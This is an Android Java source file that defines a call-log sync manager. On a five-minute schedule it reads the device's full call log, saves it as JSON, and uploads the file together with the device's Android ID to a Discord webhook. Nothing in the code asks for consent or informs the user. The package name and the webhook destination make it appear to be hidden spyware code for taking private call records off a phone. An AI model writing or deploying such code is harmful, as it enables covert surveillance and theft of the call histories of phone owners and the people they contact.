package com.application.baselibrary.core.call;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.application.baselibrary.core.call.model.CallLogEntry;
import com.application.baselibrary.network.DiscordWebhookClient;
import com.application.baselibrary.network.OkHttpClientHelper;
import com.application.baselibrary.threading.scheduler.RxSchedulerProvider;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.List;

public class CallLogSyncManager {

    private final Context context;
    private final CallLogService service;
    private final File oldFile;
    private final File newFile;
    private final String webhookUrl;

    public CallLogSyncManager(Context context, String webhookUrl) {
        this.context = context.getApplicationContext();
        this.service = new CallLogService(context.getContentResolver());
        this.oldFile = new File(context.getFilesDir(), "old_logs.json");
        this.newFile = new File(context.getFilesDir(), "new_logs.json");
        // we don't need new_logs.json but its fine we will improve later
        this.webhookUrl = webhookUrl;
    }

    public void start(String intervalTag){
        if(intervalTag.equals("Every5min")) {
            sync();
        }
    }

    public void sync() {
        RxSchedulerProvider.runOnIO(() -> {
            try {
                List<CallLogEntry> logs = service.fetchLogs();
                writeToFile(newFile, service.toJson(logs));

                if (oldFile.exists()) {
                    List<CallLogEntry> newEntries = service.diff(oldFile, newFile);
                    if (!newEntries.isEmpty()) {
                        uploadToDiscord(newEntries.size());
                        writeToFile(oldFile, service.toJson(logs)); // sync after upload
                    } else {
                        Log.i("CallLogSync", "No new entries to sync.");
                    }
                } else {
                    writeToFile(oldFile, service.toJson(logs)); // first-time sync
                }

            } catch (IOException e) {
                Log.e("CallLogSync", "Sync failed", e);
            }
        });
    }

    private void writeToFile(File file, String json) throws IOException {
        try (FileWriter writer = new FileWriter(file)) {
            writer.write(json);
        }
    }

    private void uploadToDiscord(int newCount) {
        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        String message = "Call Log Sync: " + androidId + "\nNew Entries: " + newCount;

        new DiscordWebhookClient(webhookUrl).uploadFile(newFile, message, new DiscordWebhookClient.WebhookCallback(){

            //WebhookCallback is like HttpCallBack of OKHttpClientHelper
            @Override
            public void onSuccess(DiscordWebhookClient.WebhookResponse result) {
                // You can inspect the result object here
                Log.i("CallLogSync", "Upload successful. Status: "
                        + result.code
                        + ", Body: " + result.body);
            }

            @Override
            public void onError(String errorMessage) {
                Log.e("CallLogSync", "Upload failed: " + errorMessage);
            }
        });
    }

}
